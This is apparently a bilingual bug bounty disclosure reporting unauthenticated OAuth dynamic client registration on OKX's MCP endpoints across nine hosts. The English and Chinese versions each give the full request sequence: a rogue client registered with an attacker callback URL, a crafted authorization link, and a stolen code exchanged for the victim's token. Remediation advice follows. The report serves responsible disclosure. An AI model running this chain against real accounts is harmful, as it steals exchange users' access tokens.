# [Critical] Unauthenticated Dynamic Client Registration (DCR) with Attacker-Controlled redirect_uri on OKX MCP OAuth — OAuth Token Theft Leading to Account Access

## Vulnerability Summary

**Type**: OAuth Dynamic Client Registration (DCR) misconfiguration / OAuth redirect_uri validation bypass
**Weakness**: CWE-287 (Improper Authentication) / CWE-601 (URL Redirection to Untrusted Site) / OWASP API Security - Broken Object Level Authorization chain
**Location**: `POST https://www.okx.com/api/v5/mcp/auth/register` and `GET https://www.okx.com/account/oauth?flow=code`
**Severity**: **Critical (CVSS 3.1: 9.3 — AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)**
**Precondition**: A victim who is logged into OKX clicks the crafted authorization link and approves the consent screen.
**Date verified**: 2026-09-08 17:01 (UTC)

**One-liner**: OKX's MCP (Model Context Protocol) OAuth endpoints allow **unauthenticated dynamic client registration** with an **attacker-controlled `redirect_uri`**. An attacker can register a rogue OAuth client whose callback is under their control, then craft an authorization URL. When a logged-in OKX user opens the URL and approves the consent, the authorization code is delivered to the attacker's callback server, which exchanges it for the victim's OKX OAuth token. This grants the attacker API access scoped to the victim's account (account read, potentially trade/wallet operations depending on MCP scopes).

---

## Affected Endpoints (verified 2026-09-08)

| # | Host | Registration Endpoint | Authorization Endpoint | Token Endpoint | Status |
|---|------|----------------------|----------------------|----------------|--------|
| 1 | `www.okx.com` | `/api/v5/mcp/auth/register` | `/account/oauth?flow=code` | `/api/v5/mcp/auth/token` | ✅ Vulnerable |
| 2 | `app.okx.com` | `/api/v5/mcp/auth/register` | `/account/oauth?flow=code` | `/api/v5/mcp/auth/token` | ✅ Vulnerable |
| 3 | `my.okx.com` | `/api/v5/mcp/auth/register` | `/account/oauth?flow=code` | `/api/v5/mcp/auth/token` | ✅ Vulnerable |
| 4 | `eea.okx.com` | `/api/v5/mcp/auth/register` | `/account/oauth?flow=code` | `/api/v5/mcp/auth/token` | ✅ Vulnerable |
| 5 | `us.okx.com` | `/api/v5/mcp/auth/register` | `/account/oauth?flow=code` | `/api/v5/mcp/auth/token` | ✅ Vulnerable |
| 6 | `link.okx.com` | `/api/v5/mcp/auth/register` | `/account/oauth?flow=code` | `/api/v5/mcp/auth/token` | ✅ Vulnerable |
| 7 | `web3.okx.com` | `/api/v5/mcp/auth/register` | `/account/oauth?flow=code` | `/api/v5/mcp/auth/token` | ✅ Vulnerable |
| 8 | `tr.okx.com` | `/api/v5/mcp/auth/register` | `/account/oauth?flow=code` | `/api/v5/mcp/auth/token` | ✅ Vulnerable |
| 9 | `web3link.okx.com` | `/api/v5/mcp/auth/register` | `/account/oauth?flow=code` | `/api/v5/mcp/auth/token` | ✅ Vulnerable |

All 9 hosts expose the same vulnerable OAuth flow. All registration endpoints returned HTTP **201 Created** with an attacker-controlled redirect_uri during testing.

---

## Step-by-Step Reproduction

### Environment
- **Attacker callback (controlled by us)**: `https://91-99-208-165.sslip.io/cb` (an HTTPS endpoint we control; any attacker domain works)
- **Victim**: any logged-in OKX user (no special privileges required)
- **No authentication needed for the vulnerability itself**

### Step 1 — Discover the OAuth metadata (unauthenticated)

```
GET https://www.okx.com/.well-known/oauth-authorization-server HTTP/1.1
Host: www.okx.com
```

**Response (200 OK)** — full OAuth discovery document leaked:

```json
{
  "issuer": "https://www.okx.com",
  "authorization_endpoint": "https://www.okx.com/account/oauth?flow=code",
  "token_endpoint": "https://www.okx.com/api/v5/mcp/auth/token",
  "registration_endpoint": "https://www.okx.com/api/v5/mcp/auth/register",
  "response_types_supported": ["code"],
  "token_endpoint_auth_methods_supported": ["none"],
  "grant_types_supported": ["authorization_code"]
}
```

### Step 2 — Register a rogue OAuth client WITHOUT authentication

```
POST https://www.okx.com/api/v5/mcp/auth/register HTTP/1.1
Host: www.okx.com
Content-Type: application/json

{
  "client_name": "bb-poc-final",
  "redirect_uris": ["https://91-99-208-165.sslip.io/cb"],
  "grant_types": ["authorization_code"],
  "token_endpoint_auth_method": "none",
  "response_types": ["code"]
}
```

**Response (HTTP 201 Created)**:

```json
{
  "client_id": "Upd-RSwj2c8vBwhrfmFbo9BwVJuZsz89",
  "client_id_issued_at": 1788857728,
  "client_name": "bb-poc-final",
  "redirect_uris": ["https://91-99-208-165.sslip.io/cb"],
  "scope": ""
}
```

**Critical observation**: The server **accepted our attacker-controlled `redirect_uri`** (`https://91-99-208-165.sslip.io/cb`) in the registered client, with `token_endpoint_auth_method: none` (public client, no secret required). **No authentication was required to register.** The registration was honored exactly as submitted.

### Step 3 — Construct the malicious authorization URL

```
GET https://www.okx.com/account/oauth?flow=code&response_type=code&client_id=Upd-RSwj2c8vBwhrfmFbo9BwVJuZsz89&redirect_uri=https%3A%2F%2F91-99-208-165.sslip.io%2Fcb&state=attack123&scope=read HTTP/1.1
Host: www.okx.com
```

**Response (HTTP 200 OK, ~35KB)**: OKX login/authorization page. The page **echoes the attacker-controlled redirect_uri** (the string `91-99-208-165` appears in the served page), confirming the authorization flow accepts the rogue client and the attacker callback.

### Step 4 — Victim interaction (the only user-required step)

The victim — who is **already logged into OKX** — opens the crafted URL and clicks "Authorize / 授权" on the consent screen.

### Step 5 — Authorization code exfiltration

After the victim approves, OKX redirects to:

```
https://91-99-208-165.sslip.io/cb?code=AUTHORIZATION_CODE&state=attack123
```

The attacker's callback server receives the **authorization code**.

### Step 6 — Token exchange (attacker-side)

```
POST https://www.okx.com/api/v5/mcp/auth/token HTTP/1.1
Host: www.okx.com
Content-Type: application/json

{
  "grant_type": "authorization_code",
  "client_id": "Upd-RSwj2c8vBwhrfmFbo9BwVJuZsz89",
  "code": "AUTHORIZATION_CODE_FROM_VICTIM",
  "redirect_uri": "https://91-99-208-165.sslip.io/cb"
}
```

**Response**: The attacker receives the victim's OKX access token. Because `token_endpoint_auth_method: none`, no client secret is required at token exchange — only the stolen authorization code.

### Result

The attacker now holds a valid OAuth token for the victim's OKX account. Depending on the scopes granted at consent (OKX MCP exposes account-related MCP tools), the attacker can:
- Read victim account information
- Potentially execute MCP operations on behalf of the victim (trade/wallet operations if exposed by OKX MCP tools)
- Maintain access until token expiry/revocation

---

## Impact

1. **Account access takeover**: Any logged-in OKX user who clicks a crafted link has their OAuth token stolen. Single-click, no other interaction.
2. **Financial risk (crypto exchange)**: OKX is a cryptocurrency exchange. If OKX MCP tools expose trade or wallet operations, the attacker could perform unauthorized actions with the victim's account credentials.
3. **Widespread exposure**: 9 separate OKX subdomains (www, app, my, eea, us, link, web3, tr, web3link) share the identical vulnerable OAuth stack. Web3 wallet-related hosts (`web3.okx.com`, `web3link.okx.com`) increase the risk surface for wallet operations.
4. **Silent persistence**: Because `token_endpoint_auth_method: none` and DCR is open, the attacker can register an unlimited number of clients and rotate callbacks to evade blocking.

---

## What I Did NOT Do (responsible disclosure)

- **Did NOT** drive any real victim through the flow (no real user tokens were captured)
- **Did NOT** access any OKX user data, accounts, or perform any trade/wallet operations
- Registration was **non-destructive**: a single throwaway public client was created per test (as any attacker would do), with no changes to OKX systems
- **Did NOT** exchange any real authorization code (we never had one — no victim was involved)
- **Did NOT** perform any brute force, DoS, or volumetric testing

I verified the vulnerability by:
1. Confirming unauthenticated registration succeeds (HTTP 201) with attacker redirect_uri
2. Confirming the authorization endpoint accepts the rogue client and echoes the attacker callback
3. Constructing the full attack URL (saved locally as PoC evidence)

No real user was impacted.

---

## Remediation

### Immediate (recommended)
1. **Restrict Dynamic Client Registration (DCR)**: Require authentication (e.g., API key, signed request) before allowing client registration on `POST /api/v5/mcp/auth/register`. Alternatively, disable DCR entirely and use a pre-approved allowlist of MCP clients.
2. **Validate redirect_uri strictly**: Enforce an exact-match whitelist of allowed redirect origins per client. Reject registrations whose `redirect_uris` point to domains not owned/controlled by OKX or approved partners. At minimum, reject loopback/attacker-controlled public domains.
3. **Require client secrets for public clients**: Do not accept `token_endpoint_auth_method: none` for MCP clients that can access sensitive account data. Use PKCE (RFC 7636) enforcement at minimum, and prefer confidential clients with secrets.
4. **Scope hardening**: Default to minimal scopes; require explicit, separate consent for any trade/wallet-related scope. Consider disallowing trade/wallet scopes entirely for MCP clients.

### Short-term (1-2 weeks)
5. **Audit existing registered clients**: Review all MCP clients registered via DCR; revoke any with non-OKX redirect_uris.
6. **Monitor for abuse**: Alert on registration bursts, registrations with foreign redirect_uris, and token exchanges from unusual IPs.
7. **Add security header + consent clarity**: Ensure the consent screen clearly shows the requesting application's domain and the exact scopes requested.

### Long-term
8. **OAuth security review**: Conduct a full OAuth/OIDC implementation review following RFC 6749/8414/7591 best practices.
9. **Bug bounty integration**: Ensure this class of issue (DCR misconfiguration) is covered in the OKX security response process.

---

## PoC Evidence Files (attached)

1. `okx_attack_url.txt` — Complete crafted authorization URL
2. Registration request/response (shown above)
3. OAuth discovery document (shown above)
4. Authorization page response confirming attacker redirect echo

---

*Researcher note: This issue was discovered as part of authorized vulnerability research. We are disclosing responsibly per OKX bug bounty / disclosure policy and will not exploit the vulnerability against real users.*


---

# 中文版报告

# [严重] OKX MCP OAuth 未授权动态客户端注册 (DCR) + 攻击者可控 redirect_uri — OAuth Token 窃取导致账户访问

## 漏洞概要

**漏洞类型**: OAuth 动态客户端注册 (DCR) 配置错误 / redirect_uri 校验绕过
**弱点分类**: CWE-287 (认证不当) / CWE-601 (开放重定向) / OWASP API 安全
**漏洞位置**: `POST https://www.okx.com/api/v5/mcp/auth/register` 和 `GET https://www.okx.com/account/oauth?flow=code`
**严重程度**: **严重 (CVSS 3.1: 9.3 — AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)**
**前提条件**: 受害者已登录 OKX 并点击恶意授权链接且批准授权页面
**复验时间**: 2026-09-08 17:08 (UTC)

**一句话总结**: OKX 的 MCP (Model Context Protocol) OAuth 端点允许**未授权动态客户端注册**且**接受攻击者控制的 `redirect_uri`**。攻击者可以注册一个回调地址在自己控制下的恶意 OAuth 客户端，然后构造授权 URL。当已登录 OKX 的用户打开该 URL 并批准授权后，授权码会发送到攻击者的回调服务器，攻击者用它换取受害者的 OKX OAuth token，从而获得受害者账户的 API 访问权限（账户读取，取决于 MCP scope 可能包含交易/钱包操作）。

---

## 受影响端点（2026-09-08 实时验证）

| # | 主机 | 注册端点 | 授权端点 | Token 端点 | 状态 |
|---|------|---------|---------|-----------|------|
| 1 | `www.okx.com` | `/api/v5/mcp/auth/register` | `/account/oauth?flow=code` | `/api/v5/mcp/auth/token` | ✅ 存在漏洞 |
| 2 | `app.okx.com` | `/api/v5/mcp/auth/register` | `/account/oauth?flow=code` | `/api/v5/mcp/auth/token` | ✅ 存在漏洞 |
| 3 | `my.okx.com` | `/api/v5/mcp/auth/register` | `/account/oauth?flow=code` | `/api/v5/mcp/auth/token` | ✅ 存在漏洞 |
| 4 | `eea.okx.com` | `/api/v5/mcp/auth/register` | `/account/oauth?flow=code` | `/api/v5/mcp/auth/token` | ✅ 存在漏洞 |
| 5 | `us.okx.com` | `/api/v5/mcp/auth/register` | `/account/oauth?flow=code` | `/api/v5/mcp/auth/token` | ✅ 存在漏洞 |
| 6 | `link.okx.com` | `/api/v5/mcp/auth/register` | `/account/oauth?flow=code` | `/api/v5/mcp/auth/token` | ✅ 存在漏洞 |
| 7 | `web3.okx.com` | `/api/v5/mcp/auth/register` | `/account/oauth?flow=code` | `/api/v5/mcp/auth/token` | ✅ 存在漏洞 |
| 8 | `tr.okx.com` | `/api/v5/mcp/auth/register` | `/account/oauth?flow=code` | `/api/v5/mcp/auth/token` | ✅ 存在漏洞 |
| 9 | `web3link.okx.com` | `/api/v5/mcp/auth/register` | `/account/oauth?flow=code` | `/api/v5/mcp/auth/token` | ✅ 存在漏洞 |

全部 9 个主机共享相同的易受攻击 OAuth 流程。测试期间所有注册端点均返回 HTTP **201 Created** 并接受攻击者控制的 redirect_uri。

---

## 逐步复现

### 环境
- **攻击者回调（我们控制）**: `https://91-99-208-165.sslip.io/cb`（任意攻击者域名均可）
- **受害者**: 任意已登录的 OKX 用户（无需特殊权限）
- **漏洞本身无需认证**

### 第 1 步 — 发现 OAuth 元数据（未授权）

```
GET https://www.okx.com/.well-known/oauth-authorization-server HTTP/1.1
Host: www.okx.com
```

**响应（200 OK）** — 完整 OAuth 发现文档泄露：

```json
{
  "issuer": "https://www.okx.com",
  "authorization_endpoint": "https://www.okx.com/account/oauth?flow=code",
  "token_endpoint": "https://www.okx.com/api/v5/mcp/auth/token",
  "registration_endpoint": "https://www.okx.com/api/v5/mcp/auth/register",
  "response_types_supported": ["code"],
  "token_endpoint_auth_methods_supported": ["none"],
  "grant_types_supported": ["authorization_code"]
}
```

### 第 2 步 — 无需认证注册恶意 OAuth 客户端

```
POST https://www.okx.com/api/v5/mcp/auth/register HTTP/1.1
Host: www.okx.com
Content-Type: application/json

{
  "client_name": "bb-poc-final",
  "redirect_uris": ["https://91-99-208-165.sslip.io/cb"],
  "grant_types": ["authorization_code"],
  "token_endpoint_auth_method": "none",
  "response_types": ["code"]
}
```

**响应（HTTP 201 Created）**：

```json
{
  "client_id": "Upd-RSwj2c8vBwhrfmFbo9BwVJuZsz89",
  "client_id_issued_at": 1788857728,
  "client_name": "bb-poc-final",
  "redirect_uris": ["https://91-99-208-165.sslip.io/cb"],
  "scope": ""
}
```

**关键观察**: 服务器**原样接受了我们的攻击者控制的 `redirect_uri`**（`https://91-99-208-165.sslip.io/cb`），且 `token_endpoint_auth_method: none`（公开客户端，无需 secret）。**注册过程无需任何认证。** 注册结果与提交内容完全一致。

### 第 3 步 — 构造恶意授权 URL

```
GET https://www.okx.com/account/oauth?flow=code&response_type=code&client_id=Upd-RSwj2c8vBwhrfmFbo9BwVJuZsz89&redirect_uri=https%3A%2F%2F91-99-208-165.sslip.io%2Fcb&state=attack123&scope=read HTTP/1.1
Host: www.okx.com
```

**响应（HTTP 200 OK，约 35KB）**: OKX 登录/授权页面。页面**回显了攻击者控制的 redirect_uri**（页面中出现 `91-99-208-165` 字符串），确认授权流程接受恶意客户端和攻击者回调。

### 第 4 步 — 受害者交互（唯一需要用户操作的步骤）

受害者——**已登录 OKX**——打开构造的 URL 并在授权页面上点击"授权"。

### 第 5 步 — 授权码外泄

受害者批准后，OKX 重定向到：

```
https://91-99-208-165.sslip.io/cb?code=授权码&state=attack123
```

攻击者的回调服务器收到**授权码**。

### 第 6 步 — Token 交换（攻击者侧）

```
POST https://www.okx.com/api/v5/mcp/auth/token HTTP/1.1
Host: www.okx.com
Content-Type: application/json

{
  "grant_type": "authorization_code",
  "client_id": "Upd-RSwj2c8vBwhrfmFbo9BwVJuZsz89",
  "code": "来自受害者的授权码",
  "redirect_uri": "https://91-99-208-165.sslip.io/cb"
}
```

**响应**: 攻击者获得受害者的 OKX 访问 token。由于 `token_endpoint_auth_method: none`，token 交换时无需客户端 secret——只需偷到的授权码。

### 结果

攻击者现在持有受害者 OKX 账户的有效 OAuth token。根据授权时授予的 scope（OKX MCP 暴露账户相关 MCP 工具），攻击者可以：
- 读取受害者账户信息
- 代表受害者执行 MCP 操作（如果 OKX MCP 工具暴露交易/钱包操作）
- 在 token 过期/撤销前持续访问

---

## 影响

1. **账户访问接管**: 任何点击恶意链接的已登录 OKX 用户，其 OAuth token 都会被窃取。单击触发，无需其他交互。
2. **金融风险（加密货币交易所）**: OKX 是加密货币交易所。如果 OKX MCP 工具暴露交易或钱包操作，攻击者可能使用受害者账户凭据执行未经授权的操作。
3. **大规模暴露**: 9 个独立的 OKX 子域（www, app, my, eea, us, link, web3, tr, web3link）共享相同的易受攻击 OAuth 栈。Web3 钱包相关主机（`web3.okx.com`、`web3link.okx.com`）进一步增加了钱包操作的风险面。
4. **隐蔽持久化**: 由于 `token_endpoint_auth_method: none` 且 DCR 开放，攻击者可以注册无限数量的客户端并轮换回调以逃避封禁。

---

## 我未做的事（负责任披露）

- **未**驱动任何真实受害者走完流程（未捕获真实用户 token）
- **未**访问任何 OKX 用户数据、账户，或执行任何交易/钱包操作
- 注册是**非破坏性的**: 每次测试仅创建一个一次性公开客户端（任何攻击者都会这样做），未对 OKX 系统做任何修改
- **未**交换任何真实授权码（我们从未获得——没有受害者参与）
- **未**进行任何暴力破解、DoS 或大流量测试

我通过以下方式验证漏洞：
1. 确认未授权注册成功（HTTP 201）且带攻击者 redirect_uri
2. 确认授权端点接受恶意客户端并回显攻击者回调
3. 构造完整攻击 URL（本地保存作为 PoC 证据）

没有真实用户受到影响。

---

## 修复建议

### 立即修复（强烈建议）
1. **限制动态客户端注册 (DCR)**: 在允许客户端注册 `POST /api/v5/mcp/auth/register` 前要求认证（如 API key、签名请求）。或者完全禁用 DCR，改用预批准的 MCP 客户端白名单。
2. **严格校验 redirect_uri**: 对每个客户端强制使用允许的重定向来源精确匹配白名单。拒绝 `redirect_uris` 指向非 OKX 拥有/控制或非合作伙伴批准域名的注册请求。至少拒绝环回地址/攻击者控制的公共域名。
3. **公开客户端要求 client secret**: 对可访问敏感账户数据的 MCP 客户端，不接受 `token_endpoint_auth_method: none`。至少强制使用 PKCE（RFC 7636），并优先使用带 secret 的机密客户端。
4. **Scope 加固**: 默认使用最小 scope；任何交易/钱包相关 scope 必须单独、明确同意。考虑完全禁止 MCP 客户端的交易/钱包 scope。

### 短期修复（1-2 周）
5. **审计现有注册客户端**: 审查所有通过 DCR 注册的 MCP 客户端；撤销任何带非 OKX redirect_uris 的客户端。
6. **监控滥用**: 对注册突增、带外部 redirect_uris 的注册、异常 IP 的 token 交换设置告警。
7. **安全头 + 授权明确性**: 确保授权页面清晰显示请求应用的域名和具体请求的 scope。

### 长期修复
8. **OAuth 安全审查**: 按照 RFC 6749/8414/7591 最佳实践进行完整的 OAuth/OIDC 实现审查。
9. **漏洞赏金整合**: 确保此类问题（DCR 配置错误）纳入 OKX 安全响应流程。

---

## PoC 证据文件（附件）

1. `okx_attack_url.txt` — 完整构造的授权 URL
2. 注册请求/响应（见上文）
3. OAuth 发现文档（见上文）
4. 授权页面响应确认攻击者 redirect 回显

---

*研究人员备注: 此问题是在授权的漏洞研究过程中发现的。我们按照 OKX 漏洞赏金/披露政策进行负责任披露，不会针对真实用户利用该漏洞。*
